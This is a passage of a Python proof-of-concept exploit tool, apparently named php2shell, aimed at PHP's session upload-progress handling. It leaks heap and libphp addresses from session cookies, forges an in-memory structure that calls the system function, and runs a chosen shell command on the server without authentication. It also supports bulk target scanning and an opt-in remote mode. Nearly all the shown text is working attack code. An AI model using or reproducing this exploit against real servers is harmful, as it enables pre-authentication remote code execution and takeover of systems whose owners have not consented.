                fh.write(json.dumps(fp, default=str) + "\n")

    if workers <= 1:
        for i, url in enumerate(targets):
            fp = _one(url)
            rows.append(fp)
            _report(fp, i + 1)
    else:
        idx = {url: i for i, url in enumerate(targets)}
        done = 0
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futs = {pool.submit(_one, url): url for url in targets}
            for fut in as_completed(futs):
                fp = fut.result()
                rows.append(fp)
                done += 1
                _report(fp, done)

    if args.json:
        print(json.dumps(rows if len(rows) > 1 else rows[0], indent=2,
                         default=str))

    if not args.quiet and total > 1:
        counts = {}
        for r in rows:
            k = r.get("status", "?")
            counts[k] = counts.get(k, 0) + 1
        parts = ", ".join(f"{k}={v}" for k, v in sorted(counts.items()))
        print(f"\n{YELLOW}Summary ({total} targets): {parts}{ENDC}")

    if not args.quiet and total == 1:
        fp = rows[0]
        if fp.get("x_powered_by"):
            print(f"  X-Powered-By: {fp['x_powered_by']}")
        if fp.get("server"):
            print(f"  Server: {fp['server']}")
        fixes = ", ".join(
            f"{k} -> {'.'.join(map(str, v))}"
            for k, v in FIX_VERSIONS.items()
        )
        print(f"  Fix versions: {fixes}")
        print(f"  Mitigation: session.upload_progress.enabled = Off")

    vuln = any(r.get("likely_vulnerable") for r in rows)
    return 2 if vuln else 0


def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def read_offsets_file(path):
    vals = {}
    if not path:
        return vals
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                vals[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return vals


class Target:

    def __init__(self, url, timeout=30.0, verbose=True, color=True):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL must be http:// or https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose
        self.color = color
        self.t0 = time.monotonic()

    _ANSI_RE = re.compile(r"\033\[[0-9;]*m")

    def log(self, msg):
        if not self.verbose:
            return
        if not self.color:
            msg = Target._ANSI_RE.sub("", msg)
        print(msg, flush=True)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection(
                    (self.host, self.port), timeout=self.timeout
                )
                if self.https:
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last

    def post(self, body, boundary, read_cap=1 << 20, timeout=None,
             extra_headers=None):
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)

        data = bytearray()

        def _reader():
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path, read_cap=1 << 20):
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


def probe_memory_limit(target):
    """One request: force the OOM fatal, read N from
    'Allowed memory size of N bytes exhausted'. Returns MB or None if
    display_errors is Off or the body is stripped. Replaces blind
    memory_limit sweeps."""
    boundary = b"P" * 10
    # 16 MiB field: cheap wire, overshoots any realistic memory_limit.
    body = build_multipart(
        [{"name": "probe", "data": b"A" * (16 * 1024 * 1024)}],
        boundary,
    )
    try:
        resp = target.post(body, boundary, read_cap=1 << 20, timeout=30.0)
    except OSError:
        return None
    m = FATAL_MB_RE.search(resp)
    if not m:
        return None
    return max(1, int(m.group(1)) // (1024 * 1024))


def parse_cookie(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw):
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw, dtor_offset):
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


class Exploit:

    def __init__(self, target, cmd, zif_offset, dtor_offset, htdata_offset,
                 huge_mb=12, verbose=True, profile=None):
        self.t = target
        self.cmd = cmd.encode() if isinstance(cmd, str) else cmd
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.verbose = verbose
        # Accept a dict (new) or a legacy string alias ("bookworm"/"lab").
        if isinstance(profile, str):
            profile = find_profile(profile) or {}
        self.profile = profile or {}
        stages = self.profile.get("stages", {})
        self.stage1_n = stages["stage1_n"]
        self.stage2_t = stages["stage2_t"]
        self.stage2_v = stages["stage2_v"]
        self.stage3_pads = [tuple(p) for p in stages["stage3_pads"]]
        self.stage3_carrier = stages["stage3_carrier"]
        self.stage3_prime_cookie = stages.get("stage3_prime_cookie", False)

    def _big_field(self):
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self):
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self):
        self.t.log(f"{YELLOW}[*] rotating worker{ENDC}")
        parts = [
            {"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)
        ]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(
            build_multipart(parts, b"S" * 17), b"S" * 17,
            read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
        )
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(
            build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
            read_cap=65536, timeout=20.0,
        )
        time.sleep(0.5)

    def stage1(self):
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(
            build_multipart(parts, b"S" * 17), b"S" * 17,
            read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
        )
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self.t.post(
            build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20,
        )
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self):
        parts = [
            {"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)
        ]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(
            build_multipart(parts, b"S" * 17), b"S" * 17,
            read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
        )
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append(
                    {"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v}
                )

        resp = self.t.post(
            build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20,
        )
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata, zif):
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(
                f"command is {len(cmd)} bytes; max {MAX_CMD} "
                "(use 'sh</out/c' indirection for longer commands)"
            )
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)
        struct.pack_into("<Q", ht, E + 0x08, 0)
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<Q", ht, E + 0x18, 0)
        struct.pack_into("<Q", ht, E + 0x20, 0)
        struct.pack_into("<I", ht, E + 0x28, 0)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x30, 0)
        struct.pack_into("<Q", ht, E + 0x38, 0)
        struct.pack_into("<I", ht, E + 0x40, 0)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata, zif):
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(self.stage3_pads):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.stage3_prime_cookie:
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(
            build_multipart(parts, b"S" * 17), b"S" * 17,
            read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
            extra_headers=extra,
        )
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            carrier = (
                struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            )
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(
            build_multipart(parts, b"B" * 10), b"B" * 10,
            read_cap=65536, timeout=30.0,
        )


def auto_offsets(container, offsets_path, quiet):
    helper = os.path.join(HERE, "docker", "offsets.py")
    if not os.path.exists(helper):
        return {}
    if not quiet:
        print(
            f"{YELLOW}[*] reading libphp offsets from container "
            f"{container}{ENDC}",
            flush=True,
        )
    try:
        subprocess.run(
            [sys.executable, helper, container, offsets_path],
            check=False, timeout=60,
            stdout=None if not quiet else subprocess.DEVNULL,
            stderr=None if not quiet else subprocess.DEVNULL,
        )
    except (OSError, subprocess.SubprocessError):
        pass
    return read_offsets_file(offsets_path)


def run_exploit(args):
    default_proof = os.path.join(HERE, "out", "p1")
    default_offsets = os.path.join(HERE, "out", "offsets.env")
    default_cmd_file = os.path.join(HERE, "out", "c")

    if not args.url:
        print(f"{RED}[-] exploit mode requires -u/--url{ENDC}", file=sys.stderr)
        return 2

    profiles = load_all_profiles()
    if not profiles:
        print(f"{RED}[-] no profiles found under {PROFILES_DIR}/{ENDC}",
              file=sys.stderr)
        return 2

    offsets_file = args.offsets_file if args.offsets_file else default_offsets
    local_offsets = read_offsets_file(offsets_file)
    color_enabled = not args.no_color and sys.stdout.isatty()
    t = Target(args.url, timeout=args.timeout, verbose=not args.quiet,
               color=color_enabled)
    if not args.quiet:
        banner(color_enabled=color_enabled)

    pline(t, "TARGET", args.url)

    # Allow-remote gate: non-loopback requires explicit opt-in.
    is_loopback = t.host in ("127.0.0.1", "localhost", "::1")
    if not is_loopback and not args.allow_remote:
        pline(t, "DECLINE",
              f"remote target {t.host}; pass --allow-remote to opt in",
              color=RED)
        return 2

    # Preflight: platform guard + fix-threshold decline.
    fp = None
    if not args.no_preflight:
        fp = http_get_fingerprint(args.url, timeout=args.timeout)
        reason = platform_guard(fp)
        if reason and not args.force:
            pline(t, "DECLINE", f"{reason} -- re-run with --force", color=RED)
            return 2
        ver = fp.get("php_version")
        if reason:
            pline(t, "WARN", f"{reason} -- continuing (--force)",
                  color=YELLOW)
        elif fp.get("server") or ver:
            msg = f"Server: {fp.get('server') or '(none)'}"
            if ver:
                msg += f"  ·  PHP {ver}"
            pline(t, "OK", msg, color=GREEN)
        if ver and fp.get("likely_vulnerable") is False:
            # Core OOM bugs are patched -- our chain won't close -- but the
            # upload_progress filename primitive persists, so a Chain A
            # (session filename + application LFI) attack still works. Warn
            # loudly, don't decline: user may be testing calibration drift
            # or deliberately exercising the chain against a patched target.
            pline(t, "PATCHED",
                  f"PHP {ver} is at or past the branch fix "
                  f"(8.2.35 / 8.3.36 / 8.4.27 / 8.5.12); the OOM chain "
                  f"shipped here will NOT close -- Chain A "
                  f"(filename + LFI) remains viable with a separate "
                  f"primitive", color=YELLOW)

    # Autodetect container arch when loopback + no explicit --arch/--profile.
    if is_loopback and not args.arch and not args.profile:
        guessed = detect_container_arch(args.docker_container)
        if guessed:
            args.arch = guessed
            pline(t, "ARCH",
                  f"detected {guessed} from container "
                  f"{args.docker_container!r}")

    # Dispatch: pick a profile from CLI + preflight.
    profile, source = dispatch_profile(fp, args, profiles)
    if not profile:
        pline(t, "DECLINE", source, color=RED)
        pline(t, "HINT",
              "run `php2shell.py --list` for the profile catalog",
              color=YELLOW)
        return 2
    rce_tag = (" rce=verified" if profile.get("rce_verified")
               else " rce=UNVERIFIED")
    pline(t, "PROFILE", f"{profile['name']}{rce_tag}  ({source})",
          color=GREEN if profile.get("rce_verified") else YELLOW)

    # Seed huge_mb from the profile's oom_mb if the user left the default.
    if args.huge_mb == 12 and profile.get("oom_mb"):
        args.huge_mb = profile["oom_mb"]

    # memory_limit: explicit CLI wins; else one-shot probe; else leave default.
    if args.memory_limit_mb is not None:
        pline(t, "LIMIT",
              f"memory_limit = {args.memory_limit_mb}M (from CLI)")
        if args.memory_limit_mb + 4 > args.huge_mb:
            old = args.huge_mb
            args.huge_mb = args.memory_limit_mb + 4
            pline(t, "TUNE", f"huge_mb {old}M -> {args.huge_mb}M",
                  color=YELLOW)
    elif not args.no_probe:
        pline(t, "PROBE", "memory_limit probe: 16 MiB body")
        mb = probe_memory_limit(t)
        if mb:
            pline(t, "OK", f"detected memory_limit = {mb}M", color=GREEN)
            if mb + 4 > args.huge_mb:
                old = args.huge_mb
                args.huge_mb = mb + 4
                pline(t, "TUNE",
                      f"huge_mb {old}M -> {args.huge_mb}M "
                      f"(overshoot detected limit)", color=YELLOW)
        else:
            pline(t, "WARN",
                  "memory_limit probe inconclusive; "
                  f"using huge_mb={args.huge_mb}M", color=YELLOW)

    # Offsets: CLI > fresh auto-extraction > profile.
    #
    # Always re-extract on local targets when a container is named: a stale
    # offsets.env left behind by a prior calibrate / exploit against a
    # different container would otherwise silently poison the chain
    # (zif/dtor from the wrong libphp.so load different code).
    if not args.no_auto_offsets and offsets_file and is_loopback:
        fresh = auto_offsets(
            args.docker_container, offsets_file, args.quiet,
        )
        if fresh:
            local_offsets = fresh
    if args.zif_offset is None:
        args.zif_offset = local_offsets.get(
            "ZIF_OFFSET", profile["offsets"]["zif_offset"])
    if args.dtor_offset is None:
        args.dtor_offset = local_offsets.get(
            "DTOR_OFFSET", profile["offsets"]["dtor_offset"])
    if args.htdata_offset is None:
        args.htdata_offset = profile["offsets"]["htdata_offset"]

    # Command staging for commands > MAX_CMD bytes.
    proof_file = args.proof_file if args.proof_file else default_proof
    cmd = args.cmd
    if len(cmd.encode()) > MAX_CMD:
        os.makedirs(os.path.dirname(default_cmd_file), exist_ok=True)
        full_cmd = f"exec >/out/p1 2>&1\n{cmd}"
        with open(default_cmd_file, "w", encoding="utf-8") as f:
            f.write(full_cmd + "\n")
        pline(t, "STAGE",
              f"command ({len(cmd)} B) exceeds {MAX_CMD}B limit; "
              f"wrote {default_cmd_file}", color=YELLOW)
        cmd = "sh</out/c"

    pline(t, "CMD", f"{cmd!r} (original: {args.cmd!r})")
    if local_offsets:
        pline(t, "OFFSETS", f"loaded from {offsets_file}")
    pline(t, "OFFSETS",
          f"zif=0x{args.zif_offset:x}  dtor=0x{args.dtor_offset:x}  "
          f"htdata=0x{args.htdata_offset:x}")

    if args.dry_run:
        return do_dry_run(args, profile, source, t)

    ex = Exploit(
        t, cmd, zif_offset=args.zif_offset, dtor_offset=args.dtor_offset,
        htdata_offset=args.htdata_offset, huge_mb=args.huge_mb,
        verbose=not args.quiet, profile=profile,
    )

    def rotate_after_failure():
        if not args.no_retry_rotate:
            ex.rotate()

    if not args.no_pre_rotate:
        ex.rotate()

    # Stage 1: heap leak
    chunk = 0
    for attempt in range(1, args.retries + 1):
        pline(t, "STAGE 1", f"heap leak (attempt {attempt}/{args.retries})")
        chunk = ex.stage1()
        if chunk:
            pline(t, "OK", f"chunk base = 0x{chunk:x}", color=GREEN)
            break
        pline(t, "MISS", "heap leak", color=RED)
        rotate_after_failure()
    if not chunk:
        pline(t, "FAIL", "HEAP_LEAK_FAILED", color=RED)
        return 1
    ex.rotate()

    # Stage 2: libphp leak
    libphp = 0
    for attempt in range(1, args.retries + 1):
        pline(t, "STAGE 2", f"libphp leak (attempt {attempt}/{args.retries})")
        libphp = ex.stage2()
        if libphp:
            pline(t, "OK", f"libphp base = 0x{libphp:x}", color=GREEN)
            break
        pline(t, "MISS", "libphp leak", color=RED)
        rotate_after_failure()
    if not libphp:
        pline(t, "FAIL", "LIBPHP_LEAK_FAILED", color=RED)
        return 1
    ex.rotate()

    # Stage 3: RCE
    htdata = chunk + args.htdata_offset
    zif = libphp + args.zif_offset
    pline(t, "STAGE 3", f"htdata=0x{htdata:x}  zif=0x{zif:x}")

    proof = ""
    if proof_file:
        try:
            if os.path.exists(proof_file):
                os.unlink(proof_file)
        except OSError:
            pass

    for attempt in range(1, args.retries + 3):
        try:
            ex.stage3(htdata, zif)
        except OSError as e:
            pline(t, "ERR", f"request: {e}", color=RED)
        time.sleep(0.8)

        if proof_file:
            try:
                if os.path.exists(proof_file):
                    with open(proof_file, "rb") as f:
                        proof = f.read().decode("latin1").strip()
            except OSError:
                pass
        if not proof and args.fetch:
            status, body = t.get(args.fetch)
            if status == 200:
                proof = body.decode("latin1").strip()
        if proof:
            pline(t, "OK", f"stage 3 attempt {attempt} succeeded",
                  color=GREEN)
            print()
            if t.color:
                print(f"{GREEN}{BOLD}[+] PRE-AUTH RCE CONFIRMED{ENDC}")
            else:
                print("[+] PRE-AUTH RCE CONFIRMED")
            print(f"\n{GREEN}PROOF:{ENDC}\n{proof}" if t.color
                  else f"\nPROOF:\n{proof}")
            return 0
        pline(t, "RETRY", f"stage 3 attempt {attempt}, no proof yet",
              color=YELLOW)
        rotate_after_failure()

    pline(t, "FAIL",
          "EXPLOIT_FAILED (command may have executed blind)", color=RED)
    return 1


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618 / CVE-2026-109619 PoC (php2shell)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  %(prog)s check https://example.com/
  %(prog)s check -f targets.txt -o results.jsonl --workers 8
  %(prog)s exploit -u http://127.0.0.1:8088/index.php
  %(prog)s exploit -u http://127.0.0.1:8088/index.php -c 'id>/out/p1'
""",
    )
    ap.add_argument(
        "mode", choices=("check", "exploit", "labs", "calibrate"),
        nargs="?", default="exploit",
        help="check = passive GET fingerprint; "
             "exploit = RCE (default); "
             "labs = docker lab orchestration (see `labs <action>`); "
             "calibrate = discover stage params for a new build",
    )
    ap.add_argument(
        "action", nargs="?", default=None,
        help="labs mode: up / down / status / test",
    )
    ap.add_argument("-u", "--url", default=None, help="Target URL")
    ap.add_argument(
        "-f", "--file", default=None,
        help="Target list (one URL per line, # comments ok)",
    )
    ap.add_argument(
        "-p", "--proxy", default=None,
        help="HTTP proxy for check mode (e.g. http://127.0.0.1:8080)",
    )
    ap.add_argument(
        "-o", "--output", default=None,
        help="Output file (JSONL for bulk, JSON for single)",
    )
    ap.add_argument("--json", action="store_true", help="Print JSON to stdout")
    ap.add_argument(
        "--workers", type=int, default=8,
        help="Parallel workers for bulk check (default: 8)",
    )
    ap.add_argument(
        "-c", "--cmd", default="id;hostname -I;hostname",
        help="Exploit: command to run (>%d bytes auto-uses sh indirection)" % MAX_CMD,
    )
    ap.add_argument("--proof-file", default=None, help="Exploit: proof file path")
    ap.add_argument("--fetch", default="", help="Exploit: GET path for proof")
    ap.add_argument(
        "--profile", default=None,
        help="Exploit: profile name from profiles/ (see --list). "
             "Aliases: bookworm, lab. Default: auto-select from preflight.",
    )
    ap.add_argument(
        "--php-version", default=None,
        help="Exploit: PHP version to match a profile (e.g. 8.4.26). "
             "Used when preflight cannot read the version.",
    )
    ap.add_argument(
        "--arch", choices=("amd64", "aarch64"), default=None,
        help="Exploit: target CPU arch. Required for remote targets when "
             "more than one profile exists for the detected PHP version.",
    )
    ap.add_argument(
        "--list", action="store_true", dest="list_profiles",
        help="List available build profiles and their calibrated-RCE status",
    )
    ap.add_argument(
        "--dry-run", action="store_true",
        help="Exploit: print selected profile and chain params; send no "
             "exploit traffic (preflight + probe still run)",
    )
    ap.add_argument(
        "--memory-limit-mb", type=int, default=None,
        help="Exploit: target memory_limit in MB; overrides the one-shot "
             "probe",
    )
    ap.add_argument(
        "--allow-remote", action="store_true",
        help="Exploit: opt in to non-loopback targets (required for any "
             "host other than 127.0.0.1 / localhost / ::1)",
    )
    ap.add_argument(
        "--lib-in-container", default="/usr/lib/apache2/modules/libphp.so",
        help="Calibrate: libphp.so path inside the container",
    )
    ap.add_argument(
        "--image", default=None,
        help="Calibrate: image tag to record in the written profile",
    )
    ap.add_argument(
        "--distro", default=None,
        help="Calibrate: distro slug for the profile name (default: bookworm)",
    )
    ap.add_argument(
        "--zif-offset", type=lambda x: int(x, 0), default=None,
        help="Exploit: zif_system offset in libphp.so",
    )
    ap.add_argument(
        "--dtor-offset", type=lambda x: int(x, 0), default=None,
        help="Exploit: ZVAL_PTR_DTOR offset in libphp.so",
    )
    ap.add_argument(
        "--htdata-offset", type=lambda x: int(x, 0), default=None,
        help="Exploit: chunk-relative htdata offset",
    )
    ap.add_argument("--offsets-file", default=None, help="Exploit: offsets env file")
    ap.add_argument(
        "--docker-container", default="php2shell-target",
        help="Exploit: container for auto offset derivation",
    )
    ap.add_argument("--no-auto-offsets", action="store_true")
    ap.add_argument("--huge-mb", type=int, default=12)
    ap.add_argument("-t", "--timeout", type=float, default=10.0)
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--no-pre-rotate", action="store_true")
    ap.add_argument("--no-retry-rotate", action="store_true")
    ap.add_argument(
        "--no-preflight", action="store_true",
        help="Exploit: skip the Server-header platform check",
    )
    ap.add_argument(
        "--force", action="store_true",
        help="Exploit: run even if the target looks unsupported or patched",
    )
    ap.add_argument(
        "--no-probe", action="store_true",
        help="Exploit: skip the one-shot memory_limit probe",
    )
    ap.add_argument(
        "--no-color", action="store_true",
        help="disable ANSI colors in progress output",
    )
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    if args.list_profiles:
        return do_list_profiles(
            load_all_profiles(),
            color_enabled=not args.no_color and sys.stdout.isatty(),
        )

    if args.mode == "check":
        return run_check(args)
    if args.mode == "labs":
        return run_labs(args)
    if args.mode == "calibrate":
        return run_calibrate(args)
    return run_exploit(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
